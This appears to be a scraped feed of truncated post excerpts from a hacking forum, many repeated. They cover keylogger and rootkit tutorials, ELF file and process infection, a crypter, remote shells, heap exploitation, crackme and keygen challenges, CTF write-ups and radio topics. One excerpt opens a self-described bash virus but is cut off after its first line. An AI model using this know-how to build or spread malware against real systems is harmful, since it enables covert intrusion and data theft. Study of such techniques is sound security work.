after reading through PoC||GTFO right now and &hellip;", "Hi @WhiteCollar The system function actually executes /bin/sh -c command (see the man page). An sh: 1 something means that you have successfully called system but with the wrong parameter. Whatever follows the sh: 1 is what you have tried to execute\u2026 that may be non-printable garbage. Said that, a&hellip;", "Slightly off-topic. But couldn\u2019t resist  Remember kids: If something doesn\u2019t work with the tools provided, built your own. keeps your scripting/programming  knowledge up2dateimplants used knowledge even deepercoolness factor+1Just fits perfectly after reading through PoC||GTFO right now and &hellip;", "Hi @WhiteCollar The system function actually executes /bin/sh -c command (see the man page). An sh: 1 something means that you have successfully called system but with the wrong parameter. Whatever follows the sh: 1 is what you have tried to execute\u2026 that may be non-printable garbage. Said that, a&hellip;", "Bump: https://ctftime.org/event/548 We\u2019re on CTF Time.", "Only 5 days guys! Get ready!", "#Preface In this paper we will create a very basic Linux Keylogger. Keylogging is the action of recording every key pressed by the user on a keyboard. Typically this action happens without the user being aware of it, which gives the hacker the opportunity to catch usernames and/or passwords. Our ke&hellip;", "I have always wanted to dive a bit deeper into how to linux kernel internals work. To do this I figured a good starting point would be to create a small proof of concept rootkit! You can find the code for the rootkit on github https://github.com/jordan9001/superhide. This is a very simple rootkit. &hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Lots of reasons: You shouldn\u2019t use the same password twice. When you have as many counts as the modern user, it\u2019s hard to remember them all without writing them down or storing them somehow. Password managers offer a secure way to store all those passwords.", "GPG + Git https://www.passwordstore.org/", "As @dtm has explained us how to write a crypter for Windows, and @TheDoctor has done the same for C#, I\u2019m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the o&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Thanks!. Beginners are the future", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "That is not always the case, but it is true that is the most common case. This is actually platform/processor dependant.", "If you are reading this is because you have miserably failed to solve the Case GBC-17/124. LoL, just kidding. The GBC-17_124 challenge was intended to show you something that you can easily find in the real world, but still easy to solve. Yes, real world stuff is not as fun as the challenge you usua&hellip;", "That is not always the case, but it is true that is the most common case. This is actually platform/processor dependant.", "That is not always the case, but it is true that is the most common case. This is actually platform/processor dependant.", "That is not always the case, but it is true that is the most common case. This is actually platform/processor dependant.", "That is not always the case, but it is true that is the most common case. This is actually platform/processor dependant.", "#0x00ctf 2017Hello fellow nullers and lurkers alike, today we are very pleased to announce the biggest 0x00sec CTF of 2017! 0x00ctf will have challenges focussed mainly on Pwning and Reverse Engineering. timedatectl&gt;&gt; 12:30pm December 15th 2017 UTC-50x00ctf will begin at 12:30 pm US Eastern tim&hellip;", "(self-promo mode on) @FFY00 and @7ri_pl3 in case you miss it.  (self-promo mode off)", "(self-promo mode on) @FFY00 and @7ri_pl3 in case you miss it.  (self-promo mode off)", "(self-promo mode on) @FFY00 and @7ri_pl3 in case you miss it.  (self-promo mode off)", "(self-promo mode on) @FFY00 and @7ri_pl3 in case you miss it.  (self-promo mode off)", "Excellent write-up @Leeky. Extra Kudos for the 2 bytes patch", "and you can always setup a full linux environement with chroot like kali nethunter", "(self-promo mode on) @FFY00 and @7ri_pl3 in case you miss it.  (self-promo mode off)", "@0x00_Jinx Yeah I did this as well. I got pretty far but I got stuck on vm_run. I saw the hint about signals but I never even bothered about it, pretty ignorant of me . This challenge was exceptionally well designed and had a lot of depth to it, please continue creating these wonderful programs like&hellip;", "Excellent write-up @Leeky. Extra Kudos for the 2 bytes patch", "@0x00_Jinx Yeah I did this as well. I got pretty far but I got stuck on vm_run. I saw the hint about signals but I never even bothered about it, pretty ignorant of me . This challenge was exceptionally well designed and had a lot of depth to it, please continue creating these wonderful programs like&hellip;", "", "", "Excellent write-up @Leeky. Extra Kudos for the 2 bytes patch", "Thanks for this Leeky! I had given up on this challenge a while ago. I didn\u2019t realize that the lcb.boot file was also in the image and made my own file with the \u201cLCB\u201d string in it  I\u2019ll be extra careful for the next challenge tho.", "#Writeup - Look InsideSo yeah, a writeup for @0x00pf\u2019s challenge Look Inside (and also for the sub-challenge Look Deeper Inside). Considering you are interested in this article I guess you spent some time with the challenges (if not I recommend doing so before reading this as it becomes way more &hellip;", "#Writeup - Look InsideSo yeah, a writeup for @0x00pf\u2019s challenge Look Inside (and also for the sub-challenge Look Deeper Inside). Considering you are interested in this article I guess you spent some time with the challenges (if not I recommend doing so before reading this as it becomes way more &hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "Continuing the discussion from [KEYGEN] Look Inside: Please be aware that, in case you are trying to solve the KEYGEN Look Inside, the content on this new challenge may disclose extra details about the keygen. Of course it is up to you to keep on reading. You have been warned PATCHME[spoiler] T&hellip;", "You already know how it goes. Post 3 unique keys on the comments  and get you Challenge Solver Badge. Badges will be available until the first keygen/writeup is released. Please use the spoiler tag for keygens and writeups (unless you post them in a new topic). This is an experiment so I hope it wo&hellip;", "Continuing the discussion from [KEYGEN] Look Inside: Please be aware that, in case you are trying to solve the KEYGEN Look Inside, the content on this new challenge may disclose extra details about the keygen. Of course it is up to you to keep on reading. You have been warned PATCHME[spoiler] T&hellip;", "Congrats!  You made it again Looking forward to your write up! I believe it is possible a 2 bytes patch (haven\u2019t checked it yet)\u2026 Anybody?", "Just got the time to fix the bug: With the binary named LookInside echo -ne \u201c\\x90\\x90\u201d | dd of=LookInside seek=643   bs=1 count=2 conv=notrunc echo -ne \u201c\\xd7\\xd2\u201d | dd of=LookInside seek=13179 bs=1 count=2 conv=notrunc going to include an explanation for this in my writeup", "Just completed this. LOVE the tutorial. Thanks so much for this! Very interesting and learned a lot.", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "IntroductionIt has been more than a year since I published the concept of infecting an executable with shellcode here and recently I have been motivated to develop another PoC which follows the same path but at a more advanced level combining knowledge and techniques that I have learned since then.&hellip;", "If you are reading this is because you have miserably failed to solve the Case GBC-17/124. LoL, just kidding. The GBC-17_124 challenge was intended to show you something that you can easily find in the real world, but still easy to solve. Yes, real world stuff is not as fun as the challenge you usua&hellip;", "I\u2019m sure it\u2019s possible on Windows, but you will be limited to static analysis. You are likely better off just doing it in *nix. I will offer a couple hints, though: Hint 1: This is a crackme, so you are looking for a binary executable. The first hint is a command that will give you the next lay&hellip;", "Continuing the discussion from [KEYGEN] Look Inside: Please be aware that, in case you are trying to solve the KEYGEN Look Inside, the content on this new challenge may disclose extra details about the keygen. Of course it is up to you to keep on reading. You have been warned PATCHME[spoiler] T&hellip;", "Congrats @Leeky  You\u2019ve got the first badge! Looking at your first key I assume you haven\u2019t reversed the whole thing\u2026", "Continuing the discussion from [KEYGEN] Look Inside: Please be aware that, in case you are trying to solve the KEYGEN Look Inside, the content on this new challenge may disclose extra details about the keygen. Of course it is up to you to keep on reading. You have been warned PATCHME[spoiler] T&hellip;", "Continuing the discussion from [KEYGEN] Look Inside: Please be aware that, in case you are trying to solve the KEYGEN Look Inside, the content on this new challenge may disclose extra details about the keygen. Of course it is up to you to keep on reading. You have been warned PATCHME[spoiler] T&hellip;", "Congrats @Leeky  You\u2019ve got the first badge! Looking at your first key I assume you haven\u2019t reversed the whole thing\u2026", "Congrats @Leeky  You\u2019ve got the first badge! Looking at your first key I assume you haven\u2019t reversed the whole thing\u2026", "Thank you, had lots of fun!  2-VM-4-ME$ :  EV-$.ZGJ4$ ydoIdodis$    :  so-$eZG}o$ keygen-fun   :  uy-$fZGdn$", "You already know how it goes. Post 3 unique keys on the comments  and get you Challenge Solver Badge. Badges will be available until the first keygen/writeup is released. Please use the spoiler tag for keygens and writeups (unless you post them in a new topic). This is an experiment so I hope it wo&hellip;", "@0n3D3y on Linux you can use imageMagick  or GIMP. convert is actually one of the programs that comes with ImageMagick\u2026", "@0n3D3y on Linux you can use imageMagick  or GIMP. convert is actually one of the programs that comes with ImageMagick\u2026", "The binary does indeed extract just fine  [image]", "You already know how it goes. Post 3 unique keys on the comments  and get you Challenge Solver Badge. Badges will be available until the first keygen/writeup is released. Please use the spoiler tag for keygens and writeups (unless you post them in a new topic). This is an experiment so I hope it wo&hellip;", "You already know how it goes. Post 3 unique keys on the comments  and get you Challenge Solver Badge. Badges will be available until the first keygen/writeup is released. Please use the spoiler tag for keygens and writeups (unless you post them in a new topic). This is an experiment so I hope it wo&hellip;", "the thing is that i wasnt able to find smth that converts images to different kind of depth and alphas", "You need to find the binary first. If you got the first hint\u2026 just look inside", "You already know how it goes. Post 3 unique keys on the comments  and get you Challenge Solver Badge. Badges will be available until the first keygen/writeup is released. Please use the spoiler tag for keygens and writeups (unless you post them in a new topic). This is an experiment so I hope it wo&hellip;", "You already know how it goes. Post 3 unique keys on the comments  and get you Challenge Solver Badge. Badges will be available until the first keygen/writeup is released. Please use the spoiler tag for keygens and writeups (unless you post them in a new topic). This is an experiment so I hope it wo&hellip;", "You already know how it goes. Post 3 unique keys on the comments  and get you Challenge Solver Badge. Badges will be available until the first keygen/writeup is released. Please use the spoiler tag for keygens and writeups (unless you post them in a new topic). This is an experiment so I hope it wo&hellip;", "You already know how it goes. Post 3 unique keys on the comments  and get you Challenge Solver Badge. Badges will be available until the first keygen/writeup is released. Please use the spoiler tag for keygens and writeups (unless you post them in a new topic). This is an experiment so I hope it wo&hellip;", "You already know how it goes. Post 3 unique keys on the comments  and get you Challenge Solver Badge. Badges will be available until the first keygen/writeup is released. Please use the spoiler tag for keygens and writeups (unless you post them in a new topic). This is an experiment so I hope it wo&hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "@brijesh, you should edit this post.", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "Thank you for the feedback! That depends entirely on how \u201cheavy\u201d the topic I\u2019m trying to share is. This particular concept for instance is by far the most technical write-up I\u2019ve written so far. I\u2019d say it took me about 2-3 weeks of continuous research/reading and then about 4-5 days to create a p&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "TWIMC turned out the best module to start with is a classic 433 MHz module like this one (tx and rx parts): [image] Particularly you can use it to sniff and clone any OOK modulated signal, e.g. from some garage door opener (available on eBay). In this case SDR is used a as debugging tool but you c&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "Well, the title says it all. #Hints No hints\u2026 Hints are for wimps\u2026 there are no hints in real life\u2026 RulesPost at least 3 valid username/keys combination in the comments. Do not forget to use the spoiler tag Write-ups are welcomed\u2026 ChallengeGet your binary the usual way: cat text_below | base&hellip;", "", "Hello folks! I hope you\u2019re all doing great! Today\u2019s topic is by far my most favorite heap exploitation technique I\u2019ve ever dealt with until now (as far as Linux is concerned). I can\u2019t stress enough how much I love this technique. It\u2019s super smart, technical, and even though malloc has been hardened &hellip;", "#What\u2019s this about? Hello everyone, I\u2019m Noswis. You might have already met me on IRC but this my first real post here! In this post I want to show you how I made a key-generator for a puzzle that @0x00pf created. I learned a lot from the puzzle that I\u2019d like to share with you and I hope you will le&hellip;", "#What\u2019s this about? Hello everyone, I\u2019m Noswis. You might have already met me on IRC but this my first real post here! In this post I want to show you how I made a key-generator for a puzzle that @0x00pf created. I learned a lot from the puzzle that I\u2019d like to share with you and I hope you will le&hellip;", "Well done @p3rla! Glad to hear you liked it! As I said to @Noswis, please go ahead publishing your keygen and write up. To all other 0x00sec members\u2026 just hurry up, I\u2019ll stop granting   Tier-0 Challenger Solver badges when a solution (keygen or write-up) is publicly posted!.. You still can get yo&hellip;", "Well done @p3rla! Glad to hear you liked it! As I said to @Noswis, please go ahead publishing your keygen and write up. To all other 0x00sec members\u2026 just hurry up, I\u2019ll stop granting   Tier-0 Challenger Solver badges when a solution (keygen or write-up) is publicly posted!.. You still can get yo&hellip;", "Interesting keygen, thank you 0x00pf. I would like to ask the same question as Leeky asked          But I don&#39;t think: 4675702c471e606f6a23702c7466656c67        the password:    7466692c706171737b6b7268        is reversible:      67772470637a69707f69626063", "Hi, I hope I\u2019m still in time to give an answer to this challenge! I really had a good time solving it  I have a working KeyGen in python, let me know if you want a writeup about how I got it! Here are my examples: my name is p3rla - 6b79246c5f6d692c6777247c3f7e6865 myfirstsolvedchallenge:) - 6b&hellip;", "Well done @p3rla! Glad to hear you liked it! As I said to @Noswis, please go ahead publishing your keygen and write up. To all other 0x00sec members\u2026 just hurry up, I\u2019ll stop granting   Tier-0 Challenger Solver badges when a solution (keygen or write-up) is publicly posted!.. You still can get yo&hellip;", "NULL Pointer dereferenceIn the name of Allah, the most beneficent, the most merciful. Hello everyone to a boring article once again. I\u2019ve found a bit of freetime, so i decided to write this article, it isn\u2019t really well done, but i hope you guys like it and learn much !Kernel Exploitation ?&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Let\u2019s step up the game. ###Description Note down your dreams in your diary. Who knows, dreams come true and you might get a shell! ###Rules ASLR on.Make sure your malloc\u2019s version is the latest. I know its mitigations so don\u2019t try to fool me.If you\u2019re getting crashes, consult this.Only a d&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Well done @Noswis Please go ahead with the keygen and writeup it\u2019d love to see how you solved it", "Well done @Noswis Please go ahead with the keygen and writeup it\u2019d love to see how you solved it", "Hey, I\u2019m a bit late to the party but I finally got some working serials here!  The next thing I\u2019m working on is getting a serial for any arbitrary string automatically using a keygen.  Perhaps I\u2019ll even do a little writup of the process if people are interested in how I got the serials. Anyways, tha&hellip;", "Hey, I\u2019m a bit late to the party but I finally got some working serials here!  The next thing I\u2019m working on is getting a serial for any arbitrary string automatically using a keygen.  Perhaps I\u2019ll even do a little writup of the process if people are interested in how I got the serials. Anyways, tha&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "OH NO! HE\u2019S DONE IT AGAIN. This is actually pretty cool, this is essentially reflective loading on Linux? I attempted this a while back through echo &quot;C code&quot; | gcc -O - | somemagic, and it failed. I can think of some serious legitimate uses for this, such as a rapidly updating piece of software, t&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "very interesting article, thank you !", "So recently I\u2019ve been re-motivated to do some more game hacking and I thought that I\u2019d do another article to introduce more aspects on top of what I\u2019ve already shown from my previous ones. In the following document, I\u2019ll be detailing the usage of DLL injection and its advantages, a fundamental conce&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "Realmode Assembly - Writing bootable stuffPart 5: Graphic ModeWhat is this?This is going to be a walk-through in writing  Operation Systems in assembly which operate purely in Realmode. Goal will be writing different kernels from a simple \u201cHello World\u201d over small terminal programs to graphical&hellip;", "Sup folks! I hope you\u2019re doing great! CSAW Quals took place the past weekend and @exploit and myself teamed up for some binary exploitation session. He\u2019s actually so good that he pwned a 500 point binary! Interestingly enough, there was a heap exploitation-related pwnable which covered a concept I &hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "This is by all means the best price/quality SDR for beginners at the moment. If you always wanted to get started with SDR now is the best time to do it. UPD: If you never heard of Software Defined Radio I would recommend to watch Software Defined Radio with HackRF course by Michael Ossmann. I fin&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "There was the following menu as I described: Welcome to your TeamManager (TM)!0.- Exit1.- Add player2.- Remove player3.- Select player4.- Edit player5.- Show player6.- Show teamYour choice:When you enter the choice number, atoi is used behind the scenes to convert your input into an actua&hellip;", "This write-up is brilliant!!!. Congrats mate! My only comment is that I got a bit confused towards the end when you say that you can run system overwriting atoi&#39;s GOT entry. I had to download the code and take a look to understand why you have selected that function  . While reading the text it sou&hellip;", "There was the following menu as I described: Welcome to your TeamManager (TM)!0.- Exit1.- Add player2.- Remove player3.- Select player4.- Edit player5.- Show player6.- Show teamYour choice:When you enter the choice number, atoi is used behind the scenes to convert your input into an actua&hellip;", "This write-up is brilliant!!!. Congrats mate! My only comment is that I got a bit confused towards the end when you say that you can run system overwriting atoi&#39;s GOT entry. I had to download the code and take a look to understand why you have selected that function  . While reading the text it sou&hellip;", "This write-up is brilliant!!!. Congrats mate! My only comment is that I got a bit confused towards the end when you say that you can run system overwriting atoi&#39;s GOT entry. I had to download the code and take a look to understand why you have selected that function  . While reading the text it sou&hellip;", "Sup folks! I hope you are all doing great. It\u2019s been a long time since my last CTF write-up. The main reason is because I was trying to master the beast called heap exploitation and I\u2019ve yet to learn a ton about it. To showcase one of the modern ways to pwn a heap-based vulnerable binary, I\u2019ll use a&hellip;", "Sorry for necroposting, but as the current code didn\u2019t work for me I thought I would add how I fixed it, in case anybody else comes here after me. The payload, although running and passing flow over to _main, made the kernel segfault. The reason being that the CPU state had been corrupted by the sy&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "@fraq has dropped a bunch of concepts here that may be confusing for people not familiar with communications systems. So I will try, with @fraq\u2019s permission, to expand a bit further. Sure. I like these topics  As @fraq said, that elephant thingy is related to mechanical waves, like sound, not elect&hellip;", "In Part I and Part II we manage to reverse the dropper and extract the malware. We have already got the first flag from the malware sample. Now it is time to analyse the sample and get the rest of the flags. The sample we are going to analyse has a moderate complexity and a manual approach as we ha&hellip;", "In Part I and Part II we manage to reverse the dropper and extract the malware. We have already got the first flag from the malware sample. Now it is time to analyse the sample and get the rest of the flags. The sample we are going to analyse has a moderate complexity and a manual approach as we ha&hellip;", "In Part I and Part II we manage to reverse the dropper and extract the malware. We have already got the first flag from the malware sample. Now it is time to analyse the sample and get the rest of the flags. The sample we are going to analyse has a moderate complexity and a manual approach as we ha&hellip;", "In Part I and Part II we manage to reverse the dropper and extract the malware. We have already got the first flag from the malware sample. Now it is time to analyse the sample and get the rest of the flags. The sample we are going to analyse has a moderate complexity and a manual approach as we ha&hellip;", "@pry0cc, you really have to check this\u2026 code injection using ROP without ptrace from BASH! Do not underestimate the power of the shell!!", "@pry0cc, you really have to check this\u2026 code injection using ROP without ptrace from BASH! Do not underestimate the power of the shell!!", "@pry0cc, you really have to check this\u2026 code injection using ROP without ptrace from BASH! Do not underestimate the power of the shell!!", "I must say, this is the coolest thing I have ever seen. An ELF file injector in bash. I feel as if this needs its own topic. I have to share this nonetheless. Mind == Blown.", "For the LuLZ  This is a 17 LoC, multi-architecture virus (works on x86 -32/64bits-, ARM, MIPS, PowerPC,\u2026). It increases the infected binary in less than 350 bytes!!!. Feel the power of Bash! Best language ever for virus development!! #!/bin/bash#AMiINFECTEDfor f in *; do        if [ ! -z `fi&hellip;", "For the LuLZ  This is a 17 LoC, multi-architecture virus (works on x86 -32/64bits-, ARM, MIPS, PowerPC,\u2026). It increases the infected binary in less than 350 bytes!!!. Feel the power of Bash! Best language ever for virus development!! #!/bin/bash#AMiINFECTEDfor f in *; do        if [ ! -z `fi&hellip;", "For the LuLZ  This is a 17 LoC, multi-architecture virus (works on x86 -32/64bits-, ARM, MIPS, PowerPC,\u2026). It increases the infected binary in less than 350 bytes!!!. Feel the power of Bash! Best language ever for virus development!! #!/bin/bash#AMiINFECTEDfor f in *; do        if [ ! -z `fi&hellip;", "I must say, this is the coolest thing I have ever seen. An ELF file injector in bash. I feel as if this needs its own topic. I have to share this nonetheless. Mind == Blown.", "For the LuLZ  This is a 17 LoC, multi-architecture virus (works on x86 -32/64bits-, ARM, MIPS, PowerPC,\u2026). It increases the infected binary in less than 350 bytes!!!. Feel the power of Bash! Best language ever for virus development!! #!/bin/bash#AMiINFECTEDfor f in *; do        if [ ! -z `fi&hellip;", "For the LuLZ  This is a 17 LoC, multi-architecture virus (works on x86 -32/64bits-, ARM, MIPS, PowerPC,\u2026). It increases the infected binary in less than 350 bytes!!!. Feel the power of Bash! Best language ever for virus development!! #!/bin/bash#AMiINFECTEDfor f in *; do        if [ ! -z `fi&hellip;", "For the LuLZ  This is a 17 LoC, multi-architecture virus (works on x86 -32/64bits-, ARM, MIPS, PowerPC,\u2026). It increases the infected binary in less than 350 bytes!!!. Feel the power of Bash! Best language ever for virus development!! #!/bin/bash#AMiINFECTEDfor f in *; do        if [ ! -z `fi&hellip;", "For the LuLZ  This is a 17 LoC, multi-architecture virus (works on x86 -32/64bits-, ARM, MIPS, PowerPC,\u2026). It increases the infected binary in less than 350 bytes!!!. Feel the power of Bash! Best language ever for virus development!! #!/bin/bash#AMiINFECTEDfor f in *; do        if [ ! -z `fi&hellip;", "Cool. Your post would have much more value if you could explain the whys and hows behind your code. Alhough @0x00pf has already made a write-up on ELF infectors, don\u2019t hesitate on giving us your own view point. Otherwise your post is nothing more than self-advertisement and fortunately or unfortuna&hellip;", "If you are reading this is because you have miserably failed to solve the Case GBC-17/124. LoL, just kidding. The GBC-17_124 challenge was intended to show you something that you can easily find in the real world, but still easy to solve. Yes, real world stuff is not as fun as the challenge you usua&hellip;", "Continuing the discussion from [Malware Analysis] Case GBC-17_124: The dropper Part I: The get_msg FunctionOur analysis is going pretty well. By now, we know that the get_msg function is the one that gets the data from the network, data that is later dumped into a file. Time to rip it off:       &hellip;", "I will read such an article for sure!", "You\u2019ve got me thinking about writing an article on tropo-scatter radio shots now.", "You\u2019ve got me thinking about writing an article on tropo-scatter radio shots now.", "We should talk about this stuff more often", "Greetings, 0x00sec! After much discussion, the 0x00sec mods and admins have put together a new program, a Bounty Program. How it WorksThis very post will be a Wiki. Members will be able to add any topic they\u2019d like to see written about on this site. Other members will see the wiki, scroll through,&hellip;", "Be still, my heart, for I have found another waterwalker in the wild. It\u2019s not often I get to talk about signal sampling, multiplexing, digital/analog encoding, or wave propagation with people. It\u2019s a niche subject.", "@fraq has dropped a bunch of concepts here that may be confusing for people not familiar with communications systems. So I will try, with @fraq\u2019s permission, to expand a bit further. Sure. I like these topics  As @fraq said, that elephant thingy is related to mechanical waves, like sound, not elect&hellip;", "@fraq has dropped a bunch of concepts here that may be confusing for people not familiar with communications systems. So I will try, with @fraq\u2019s permission, to expand a bit further. Sure. I like these topics  As @fraq said, that elephant thingy is related to mechanical waves, like sound, not elect&hellip;", "@fraq has dropped a bunch of concepts here that may be confusing for people not familiar with communications systems. So I will try, with @fraq\u2019s permission, to expand a bit further. Sure. I like these topics  As @fraq said, that elephant thingy is related to mechanical waves, like sound, not elect&hellip;", "@fraq has dropped a bunch of concepts here that may be confusing for people not familiar with communications systems. So I will try, with @fraq\u2019s permission, to expand a bit further. Sure. I like these topics  As @fraq said, that elephant thingy is related to mechanical waves, like sound, not elect&hellip;", "@fraq has dropped a bunch of concepts here that may be confusing for people not familiar with communications systems. So I will try, with @fraq\u2019s permission, to expand a bit further. Sure. I like these topics  As @fraq said, that elephant thingy is related to mechanical waves, like sound, not elect&hellip;", "@fraq has dropped a bunch of concepts here that may be confusing for people not familiar with communications systems. So I will try, with @fraq\u2019s permission, to expand a bit further. Sure. I like these topics  As @fraq said, that elephant thingy is related to mechanical waves, like sound, not elect&hellip;", "Be still, my heart, for I have found another waterwalker in the wild. It\u2019s not often I get to talk about signal sampling, multiplexing, digital/analog encoding, or wave propagation with people. It\u2019s a niche subject.", "@fraq has dropped a bunch of concepts here that may be confusing for people not familiar with communications systems. So I will try, with @fraq\u2019s permission, to expand a bit further. Sure. I like these topics  As @fraq said, that elephant thingy is related to mechanical waves, like sound, not elect&hellip;", "@fraq has dropped a bunch of concepts here that may be confusing for people not familiar with communications systems. So I will try, with @fraq\u2019s permission, to expand a bit further. Sure. I like these topics  As @fraq said, that elephant thingy is related to mechanical waves, like sound, not elect&hellip;", "They detect infrasonic vibrations primarily using their feet. Oh, another thing to consider on top of noise is how informationally dense the signal can be and how it would be modulated to encode information. Lower frequencies do not tolerate FM very well, and AM would be hard to detect. Some sort of&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "The legend himself gave another mind-blowing talk at BH this year. Even if you are not 